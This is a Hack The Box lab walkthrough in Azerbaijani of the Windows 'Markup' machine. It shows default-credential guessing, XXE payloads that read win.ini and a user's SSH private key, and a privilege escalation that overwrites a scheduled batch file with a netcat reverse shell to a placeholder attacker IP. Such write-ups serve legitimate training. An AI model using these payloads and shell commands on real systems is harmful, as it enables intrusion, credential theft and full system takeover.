# Markup (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Asan  
> Nəticə: Administrator

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -p- -Pn → 22 (OpenSSH for Windows 8.1), 80/443 (Apache 2.4.41 + PHP 7.2.28)
└── whatweb → MegaShopping, PHPSESSID, PHP 7.2.28

İlkin Giriş
├── index.php: default creds admin:password → 302 home.php
├── services.php: client-side JS builds XML, POST → process.php
├── process.php: DOMDocument::loadXML() without XXE protection
├── XXE: file:///c:/windows/win.ini (proof of concept)
├── XXE: file:///c:/users/daniel/.ssh/id_rsa → private key
├── ssh -i id_rsa daniel@markup.htb → daniel shell
└── user.txt

Səlahiyyətlərin Artırılması
├── whoami /groups → BUILTIN\Users
├── icacls C:\Log-Management\job.bat → BUILTIN\Users:(F)
├── wget nc64.exe → C:\Log-Management\nc64.exe
├── overwrite job.bat → nc64.exe -e cmd.exe <KALI_IP> 4444
├── wait for scheduled task → shell as markup\administrator
└── root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Windows Server 2019 (1809) üzərində "MegaShopping" adlı kiçik e-ticarət tətbiqi, Apache 2.4.41, PHP 7.2.28 və 22-ci portda OpenSSH for Windows ilə xidmət göstərir. Defolt kredensial cütü sifariş səhifəsinə giriş verir, burada müştəri tərəfindəki JavaScript XML-i backend-ə göndərir, backend isə onu `DOMDocument::loadXML()` ilə xarici entity-ləri söndürmədən parse edir. Bu XXE zəifliyi ixtiyari faylları, o cümlədən yerli istifadəçinin şəxsi SSH açarını oxumağa imkan verir. Maşının özündə çox geniş ACL-lərə malik log idarəetmə batch skripti Administrator tərəfindən planlaşdırılmış tapşırıq vasitəsilə icra olunur - onu yenidən yazmaq Administrator hüquqları ilə shell verir.

---

## Kəşfiyyat

### Port Skanı

```bash
sudo nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n markup.htb
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

```bash
sudo nmap -sC -sV -Pn -n --open -p 22,80,443 markup.htb
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
```

| Port | Xidmət | Versiya                                  |
|------|--------|------------------------------------------|
| 22   | SSH    | OpenSSH for Windows 8.1                  |
| 80   | HTTP   | Apache 2.4.41 (Win64) PHP 7.2.28         |
| 443  | HTTPS  | Apache 2.4.41 (Win64) PHP 7.2.28         |

`OpenSSH for_Windows` xidmətinin olması dərhal əsas platformanı göstərir. 443-cü portdakı özü-imzalanmış sertifikatın müddəti bitib (`Not valid before: 2009-11-10`, `Not valid after: 2019-11-08`).

### /etc/hosts

```bash
echo "10.129.19.134 markup.htb" | sudo tee -a /etc/hosts
```

### Veb Tətbiqinin Müəyyən Edilməsi

```bash
whatweb -a 3 http://markup.htb
```

```
http://markup.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], HTML5,
HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28],
IP[10.129.19.134], OpenSSL[1.1.1c], PHP[7.2.28],
PasswordField[password], PoweredBy[Megacorp],
Title[MegaShopping], X-Powered-By[PHP/7.2.28]
```

Sayt "MegaShopping" brendi altında kiçik e-ticarət tətbiqidir. Açılış səhifəsi login formasıdır (`username` / `password`, POST `index.php`-ə).

---

## İlkin Giriş

### Standart Giriş Məlumatları

No CVE (custom vulnerability) - the login form accepts the default credential pair `admin:password`.

```bash
for cred in "admin:admin" "administrator:administrator" "admin:administrator" \
            "admin:password" "administrator:password"; do
  u="${cred%%:*}"; p="${cred##*:}"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -c /tmp/cj.txt -d "username=$u&password=$p" http://markup.htb/index.php)
  echo "$code  $cred"
done
```

```
200  admin:admin
200  administrator:administrator
200  admin:administrator
302  admin:password
200  administrator:password
```

Yalnız `admin:password` 302 qaytarır - uğurlu login `home.php`-ə yönləndirir.

```bash
curl -s -i -c /tmp/cj.txt \
  -d "username=admin&password=password" \
  http://markup.htb/index.php | head -20
```

```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=dl2o77jvdmmtr0envgjllaq3a8; path=/
location: home.php
```

Cookie-də nə `HttpOnly`, nə də `Secure` yoxdur - qeyd edilməyə dəyər ikinci dərəcəli zəiflikdir, lakin istismar üçün tələb olunmur.

### Tətbiqin Sadalanması

Login sonrası əsas naviqasiya aşağıdakıları ehtiva edir: `Home`, `About`, `Products`, `Order` (→ `services.php`), `Contact`. `services.php` səhifəsində HTML şərhi var:

```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

Bu, istifadəçi adının (`daniel`) sızmasıdır - sonradan XXE yolları üçün faydalıdır.

### Sifariş Forması - Müştəri Tərəfində XML

`services.php` səhifəsindəki `Order in Bulk` forması tamamilə JavaScript-də yaradılan XML-i göndərir:

```javascript
function getXml() {
    var elements = document.forms.myForm.elements;
    var xmlTemplate = '<?xml version = "1.0"?><order>';
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        if (element.tagName == "INPUT") {
            xmlTemplate = xmlTemplate + '<' + element.name + '>' +
                          element.value + '</' + element.name + '>';
        }
    }
    var e = document.getElementById("items");
    var item = e.options[e.selectedIndex].value;
    xmlTemplate = xmlTemplate + '<item>' + item + '</item>' +
                  '<address>' + document.getElementById('address').value + '</address></order>';
    var http = new XMLHttpRequest();
    http.open('POST', 'process.php', true);
    http.setRequestHeader('Content-Type', 'text/xml');
    http.send(xmlTemplate);
}
```

Yaradılan XML aşağıdakı struktura malikdir:

```xml
<?xml version = "1.0"?><order><quantity>...</quantity><item>...</item><address>...</address></order>
```

### XXE-nin Aşkarlanması

No CVE (custom vulnerability) - XML External Entity (CWE-611) via `DOMDocument::loadXML()` without `libxml_disable_entity_loader(true)`; allows reading arbitrary files.

`process.php`-ə gövdəsiz POST istifadə olunan parser-i açıqlayan PHP xəbərdarlıqları qaytarır:

```bash
curl -s -b /tmp/cj.txt -X POST http://markup.htb/process.php
```

```
Warning: DOMDocument::loadXML(): Empty string supplied as input
  in C:\xampp\htdocs\process.php on line 11
Warning: simplexml_import_dom(): Invalid Nodetype to import
  in C:\xampp\htdocs\process.php on line 12
Notice: Trying to get property 'quantity' of non-object
  in C:\xampp\htdocs\process.php on line 13
```

Bu təsdiqləyir ki, `process.php` XML-i birbaşa `DOMDocument::loadXML()` ilə parse edir, sonra SimpleXML vasitəsilə `->quantity`, `->item`, `->address` oxuyur. Xarici entity-lərin həlli aktiv saxlanılıb.

Proof of concept - `C:\windows\win.ini` oxumaq:

```bash
cat > /tmp/xxe-test.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-test.xml http://markup.htb/process.php
```

```
Your order for ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### XXE vasitəsilə Şəxsi SSH Açarı

İstifadəçi adı `daniel` (HTML şərhindəki sızma) və Windows konvensiyaları istifadəçinin OpenSSH açarına birbaşa yol verir:

```bash
cat > /tmp/xxe-ssh.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-ssh.xml http://markup.htb/process.php
```

```
Your order for -----BEGIN OPENSSH PRIVATE KEY (MASKED)-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (truncated) ...
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Qaytarılan açarı `id_rsa`-ya saxla (`Your order for ` prefiksini və ` has been processed` suffiksini çıxar), sonra düzgün icazələri təyin et:

```bash
sed -e 's/^Your order for //' -e 's/ has been processed$//' /tmp/xxe-ssh-out.txt > /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh-keygen -l -f /tmp/id_rsa
```

```
3072 SHA256:OrvhzyMF1OAj02guQWL1vg2TSovi5XIQONohNGrkRzQ daniel@Entity (RSA)
```

### SSH Girişi

```bash
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no daniel@markup.htb
```

```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

```cmd
whoami
```

```
markup\daniel
```

```cmd
hostname
```

```
MarkUp
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### İstifadəçi Bayrağı

```cmd
type C:\Users\daniel\Desktop\user.txt
```

```
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Səlahiyyətlərin Artırılması

No CVE (custom vulnerability) - incorrect permission assignment (CWE-732): `BUILTIN\Users` has Full Control over `job.bat`, which is executed by an Administrator scheduled task; overwriting the script yields an Administrator shell.

### Yerli Sadalanma

```cmd
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Maraqlı imtiyaz yoxdur (`SeImpersonatePrivilege` yoxdur). `daniel` `BUILTIN\Users` və xüsusi `MARKUP\Web Admins` qrupunun üzvüdür.

```cmd
whoami /groups
```

```
Group Name                             Type             SID
====================================== ================ ==============================================
Everyone                               Well-known group S-1-1-0
MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001
BUILTIN\Remote Management Users        Alias            S-1-5-32-580
BUILTIN\Users                          Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11
NT AUTHORITY\This Organization         Well-known group S-1-5-15
NT AUTHORITY\Local account             Well-known group S-1-5-113
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

### Log-Management Skripti

```cmd
dir C:\
```

```
 Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
09/15/2018  12:12 AM    <DIR>          PerfLogs
07/28/2021  02:01 AM    <DIR>          Program Files
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
```

`Log-Management` qovluğu fərqlənir (xüsusi, Windows üçün defolt deyil):

```cmd
dir C:\Log-Management
```

```
 Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
```

```cmd
type C:\Log-Management\job.bat
```

```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

Skript hadisə jurnallarını təmizləmək üçün `wevtutil.exe` (Windows Event Utility) çağırır - Administrator hüquqları tələb edən əməliyyatdır. Başdakı `bcdedit` yoxlaması bir qoruyucudur: skript Administrator kimi işlədilmirsə, `bcdedit` `Access` qaytarır və skript `noAdmin`-ə keçir.

### İcazələrin Yoxlanması

```cmd
icacls C:\Log-Management\job.bat
```

```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Users:(I)(RX)
```

Birinci ACE açıq şəkildə (miras alınmamış) `BUILTIN\Users` qrupuna skript üzərində Full Control (`F`) verir. `daniel` `BUILTIN\Users` üzvü olduğundan, o, `job.bat`-ı yenidən yaza bilər.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Skriptin Administrator tərəfindən planlaşdırılmış tapşırıq vasitəsilə dövri olaraq işlədilməsi ilə birlikdə (maşının müəllifi tərəfindən müşahidə edilən `wevtutil.exe` prosesləri və serverdə log təmizləmə skriptinin bütün mənası), bu, düz imtiyaz artırma yoludur: `job.bat`-ı reverse-shell işə salan skriptlə əvəz et və gözlə.

### Payload-un Yüklənməsi

Kali-də Windows `netcat` binarını endir və HTTP ilə paylaş:

```bash
cd /tmp
wget -q https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
python3 -m http.server 80
```

Hədəfdə, `daniel` kimi:

```cmd
cd C:\Log-Management
powershell -c "Invoke-WebRequest -Uri http://<KALI_IP>/nc64.exe -OutFile C:\Log-Management\nc64.exe"
dir nc64.exe
```

```
 Directory of C:\Log-Management

10/12/2026  03:02 PM            45,272 nc64.exe
```

### job.bat-ın Yenidən Yazılması

Kali-də listener işə sal:

```bash
nc -lvnp 4444
```

Skripti reverse-shell işə salan skriptlə əvəz et. Qeyd: PowerShell-dən `Set-Content` ilə `-Encoding ASCII` istifadə etmək, PowerShell-dən xam `echo > file` ilə daxil edilən UTF-16 BOM-un qarşısını alır.

```cmd
powershell -c "Set-Content -Path C:\Log-Management\job.bat -Value 'C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444' -Encoding ASCII"
type C:\Log-Management\job.bat
```

```
C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444
```

### Administrator Kimi Shell

Bir neçə dəqiqə ərzində planlaşdırılmış tapşırıq işə düşür və yenidən yazılmış skript geri qoşulur:

```
connect to [<KALI_IP>] from (UNKNOWN) [10.129.19.134] 49761
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
markup\administrator
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Root Bayrağı

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər          |
|--------|----------------|
| User   | `<USER_FLAG>`  |
| Root   | `<ROOT_FLAG>`  |

---

## Əsas Nəticələr

- **Standart giriş məlumatları hələ də giriş yoludur.** İctimai login-də `admin:password` - HTB-nin təkrarlanan mövzusudur; kiçik siyahı (`admin`, `administrator` × `admin`, `password`, `123456`) daha mürəkkəb bir şeydən əvvəl sınanmağa dəyər.
- **Mənbəni oxu.** HTML şərhi `<!-- Modified by Daniel : UI-Fix-9092-->` `daniel` adlı istifadəçinin mövcudluğuna dair yeganə ipucu idi; onsuz SSH açar yolunu təxmin etmək təmiz şansdır.
- **XXE fayl oxuma primitividir, sadəcə SSRF qadceti deyil.** Windows-da `file:///c:/...` birbaşa işləyir və açarları, kredensialları, konfiqurasiya fayllarını ekzfiltrasiya edə bilər. İstifadə olunan parseri (`DOMDocument::loadXML()` burada) və xarici entity-lərin söndürülüb-söndürülmədiyini yoxla.
- **PHP xəbərdarlıqları backend yolunu sızdırır.** `DOMDocument::loadXML(): Empty string supplied as input in C:\xampp\htdocs\process.php on line 11` xəbərdarlığı həm parseri təsdiqlədi, həm də webroot-u açıqladı.
- **ACL əsaslı imtiyaz artırma Windows-da adi haldır.** `icacls <file>` - `C:\Windows` xaricindəki hər hansı xüsusi skript üçün ilk yoxlamadır; yüksək proses tərəfindən icra olunan fayl üzərində `BUILTIN\Users:(F)` dərhal qələbədir.
- **Windows batch faylları üçün PowerShell `Set-Content -Encoding ASCII` istifadə et.** PowerShell-dən `echo > file` ilə yazmaq UTF-16 BOM yaradır, hansı ki `cmd.exe` səhv idarə edir; ASCII faylı sadə saxlayır.
- **Planlaşdırılmış tapşırıqlar etibarlı tetikleyicidir.** Skript dəyişdirildikdən sonra exploit passivdir - tapşırığı gözlə və shell-i tut.
